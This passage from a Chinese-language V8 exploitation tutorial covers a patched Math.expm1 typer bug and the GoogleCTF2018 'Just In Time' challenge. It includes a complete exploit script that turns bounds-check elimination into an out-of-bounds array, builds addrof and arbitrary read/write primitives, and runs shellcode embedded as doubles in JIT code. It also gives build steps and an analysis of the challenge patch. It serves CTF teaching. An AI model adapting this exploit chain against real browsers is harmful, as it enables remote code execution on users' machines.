class="number">1337</span>;</span><br><span class="line">    <span class="keyword">return</span> oob_array[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>发现由于 v8 认为用 <code>SameValue</code> 返回值计算出的 <code>index</code> 总是为 0 因此在 simplified lowering 阶段将 <code>CheckBound</code> 优化掉了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c4f24a562996c0a318aeac9e8ade8c96.png"
                      alt="在这里插入图片描述"
                ><br>然而我们可以通过某种手段使得 <code>Object.is</code> 返回 <code>true</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> aux = &#123; <span class="attr">mz</span>: -<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), aux.<span class="property">mz</span>);</span><br><span class="line">    <span class="keyword">let</span> oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>]</span><br><span class="line">    index *= <span class="number">1337</span>;</span><br><span class="line">    <span class="keyword">return</span> oob_array[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>由于 -0 被放到一个 <code>JSObject</code> 的一个属性中，因此即使到了 load elimination 阶段依旧没有吧 <code>SameValue</code> 优化成 <code>false</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/746bb8d8f277526cbfab70ab11cfa495.png"
                      alt="在这里插入图片描述"
                ><br>到了 escape analysis 阶段 <code>LoadField</code> 从 <code>JSObject</code> 获取属性的操作被优化为立即数 -0 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/f1398ecafb6f42b8314fc0e08e429301.png"
                      alt="在这里插入图片描述"
                ><br>到了 simplified lowering 阶段，v8 根据 <code>Math.expm1</code> 返回值一定不是 -0 将后面的 <code>CheckBounds</code> 操作优化掉。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0a7a5924c3c41c17750ff1d82afe9ef7.png"
                      alt="在这里插入图片描述"
                ><br><strong>然而 <code>Math.expm1</code> 不会返回 -0 是 patch 上去的内容，实际上 <code>Math.expm1</code> 是可以返回 -0 ，至于前面的 <code>Object.is</code> 返回 <code>false</code> 是因为返回值被优化成立即数 <code>false</code> 。</strong></p>
<p>因此可以越界访问数组 <code>oob_array</code> 。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> aux = &#123; <span class="attr">mz</span>: -<span class="number">0</span> &#125;;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), aux.<span class="property">mz</span>);</span><br><span class="line">        oob_array = [<span class="number">.1</span>]</span><br><span class="line">        index *= <span class="number">4</span>;</span><br><span class="line">        oob_array[index] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">foo</span>(-<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">trigger</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">15</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">15</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">15</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">31</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">31</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">address_of</span>(shellcode) + <span class="number">0x30n</span>;</span><br><span class="line"><span class="title function_">write</span>(shellcode_addr, <span class="title function_">read</span>(shellcode_addr) + <span class="number">0x6en</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题：GoogleCTF2018-Just-In-Time"><a href="#例题：GoogleCTF2018-Just-In-Time" class="headerlink" title="例题：GoogleCTF2018 Just In Time"></a>例题：GoogleCTF2018 Just In Time</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/googlectf2018_jistintime" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/v8</span><br><span class="line">git checkout 7.0.276.3 </span><br><span class="line">gclient sync </span><br><span class="line">patch -p1 &lt; ./path/to/addition-reducer.patch </span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是在 simplified lowering 阶段想要去掉 <code>CheckBounds</code> 检查的一个必要条件是 <code>poisoning_level_</code> 等于 <code>kDontPoison</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c715c2cbead24ee0efb738494aecc84b.png"
                      alt="在这里插入图片描述"
                ><br>搜索 <code>poisoning_level_</code> 发现如下初始化代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SimplifiedLowering::<span class="built_in">SimplifiedLowering</span>(JSGraph* jsgraph,</span><br><span class="line">                                       JSHeapBroker* js_heap_broker, Zone* zone,</span><br><span class="line">                                       SourcePositionTable* source_positions,</span><br><span class="line">                                       NodeOriginTable* node_origins,</span><br><span class="line">                                       PoisoningMitigationLevel poisoning_level)</span><br><span class="line">    : <span class="built_in">jsgraph_</span>(jsgraph),</span><br><span class="line">      <span class="built_in">js_heap_broker_</span>(js_heap_broker),</span><br><span class="line">      <span class="built_in">zone_</span>(zone),</span><br><span class="line">      <span class="built_in">type_cache_</span>(TypeCache::<span class="built_in">Get</span>()),</span><br><span class="line">      <span class="built_in">source_positions_</span>(source_positions),</span><br><span class="line">      <span class="built_in">node_origins_</span>(node_origins),</span><br><span class="line">      <span class="built_in">poisoning_level_</span>(poisoning_level) &#123;&#125;</span><br></pre></td></tr></table></figure></div>
<p>进一步搜索，发现 <code>poisoning_level_</code> 是被 <code>data-&gt;info()-&gt;GetPoisoningMitigationLevel()</code> 初始化的。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">SimplifiedLoweringPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;simplified lowering&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    <span class="function">SimplifiedLowering <span class="title">lowering</span><span class="params">(data-&gt;jsgraph(), data-&gt;js_heap_broker(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                temp_zone, data-&gt;source_positions(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                data-&gt;node_origins(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                data-&gt;info()-&gt;GetPoisoningMitigationLevel())</span></span>;</span><br><span class="line">    lowering.<span class="built_in">LowerAllNodes</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>搜索 <code>GetPoisoningMitigationLevel</code> 发现如下相关函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PoisoningMitigationLevel poisoning_level_ =</span><br><span class="line">    PoisoningMitigationLevel::kDontPoison;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetPoisoningMitigationLevel</span><span class="params">(PoisoningMitigationLevel poisoning_level)</span> </span>&#123;</span><br><span class="line">  poisoning_level_ = poisoning_level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PoisoningMitigationLevel <span class="title">GetPoisoningMitigationLevel</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> poisoning_level_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>poisoning_level_</code> 的初始化与 <code>V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS</code> 有关：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DISABLE_UNTRUSTED_CODE_MITIGATIONS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">DEFINE_BOOL</span>(untrusted_code_mitigations, V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS,</span><br><span class="line">            <span class="string">&quot;Enable mitigations for executing untrusted code&quot;</span>)</span><br><span class="line"><span class="built_in">DEFINE_BOOL</span>(branch_load_poisoning, <span class="literal">false</span>, <span class="string">&quot;Mask loads with branch conditions.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Compute and set poisoning level.</span></span><br><span class="line">  PoisoningMitigationLevel load_poisoning =</span><br><span class="line">      PoisoningMitigationLevel::kDontPoison;</span><br><span class="line">  <span class="keyword">if</span> (FLAG_branch_load_poisoning) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonAll;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FLAG_untrusted_code_mitigations) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonCriticalOnly;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">compilation_info</span>()-&gt;<span class="built_in">SetPoisoningMitigationLevel</span>(load_poisoning);</span><br></pre></td></tr></table></figure></div>
<p>因此需要将 <code>#define V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true</code> 修改为 <code>#define V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false</code> 才能触发 oob 。</p>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析 patch 文件，发现在 type lowering 阶段添加了如下优化：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line"><span class="keyword">new</span> file mode <span class="number">100644</span></span><br><span class="line">index <span class="number">0000000000.</span><span class="number">.59e8437f</span>3d</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">@@ <span class="number">-0</span>,<span class="number">0</span> <span class="number">+1</span>,<span class="number">71</span> @@</span><br><span class="line">+<span class="comment">// Copyright 2018 Google LLC</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line">+<span class="comment">// you may not use this file except in compliance with the License.</span></span><br><span class="line">+<span class="comment">// You may obtain a copy of the License at</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">//      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">// Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line">+<span class="comment">// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line">+<span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line">+<span class="comment">// See the License for the specific language governing permissions and</span></span><br><span class="line">+<span class="comment">// limitations under the License.</span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/duplicate-addition-reducer.h&quot;</span></span></span><br><span class="line">+</span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/common-operator.h&quot;</span></span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/graph.h&quot;</span></span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/node-properties.h&quot;</span></span></span><br><span class="line">+</span><br><span class="line">+<span class="keyword">namespace</span> v8 &#123;</span><br><span class="line">+<span class="keyword">namespace</span> internal &#123;</span><br><span class="line">+<span class="keyword">namespace</span> compiler &#123;</span><br><span class="line">+</span><br><span class="line">+DuplicateAdditionReducer::<span class="built_in">DuplicateAdditionReducer</span>(Editor* editor, Graph* graph,</span><br><span class="line">+                     CommonOperatorBuilder* common)</span><br><span class="line">+    : <span class="built_in">AdvancedReducer</span>(editor),</span><br><span class="line">+      <span class="built_in">graph_</span>(graph), <span class="built_in">common_</span>(common) &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::<span class="built_in">Reduce</span>(Node* node) &#123;</span><br><span class="line">+  <span class="keyword">switch</span> (node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">+    <span class="keyword">case</span> IrOpcode::kNumberAdd:</span><br><span class="line">+      <span class="keyword">return</span> <span class="built_in">ReduceAddition</span>(node);</span><br><span class="line">+    <span class="keyword">default</span>:</span><br><span class="line">+      <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="function">Reduction <span class="title">DuplicateAdditionReducer::ReduceAddition</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">ControlInputCount</span>(), <span class="number">0</span>);</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">EffectInputCount</span>(), <span class="number">0</span>);</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">ValueInputCount</span>(), <span class="number">2</span>);</span><br><span class="line">+</span><br><span class="line">+  Node* left = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">0</span>);</span><br><span class="line">+  <span class="keyword">if</span> (left-&gt;<span class="built_in">opcode</span>() != node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* right = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">1</span>);</span><br><span class="line">+  <span class="keyword">if</span> (right-&gt;<span class="built_in">opcode</span>() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* parent_left = NodeProperties::<span class="built_in">GetValueInput</span>(left, <span class="number">0</span>);</span><br><span class="line">+  Node* parent_right = NodeProperties::<span class="built_in">GetValueInput</span>(left, <span class="number">1</span>);</span><br><span class="line">+  <span class="keyword">if</span> (parent_right-&gt;<span class="built_in">opcode</span>() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="type">double</span> const1 = <span class="built_in">OpParameter</span>&lt;<span class="type">double</span>&gt;(right-&gt;<span class="built_in">op</span>());</span><br><span class="line">+  <span class="type">double</span> const2 = <span class="built_in">OpParameter</span>&lt;<span class="type">double</span>&gt;(parent_right-&gt;<span class="built_in">op</span>());</span><br><span class="line">+  Node* new_const = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">NumberConstant</span>(const1+const2));</span><br><span class="line">+</span><br><span class="line">+  NodeProperties::<span class="built_in">ReplaceValueInput</span>(node, parent_left, <span class="number">0</span>);</span><br><span class="line">+  NodeProperties::<span class="built_in">ReplaceValueInput</span>(node, new_const, <span class="number">1</span>);</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+&#125;  <span class="comment">// namespace compiler</span></span><br><span class="line">+&#125;  <span class="comment">// namespace internal</span></span><br><span class="line">+&#125;  <span 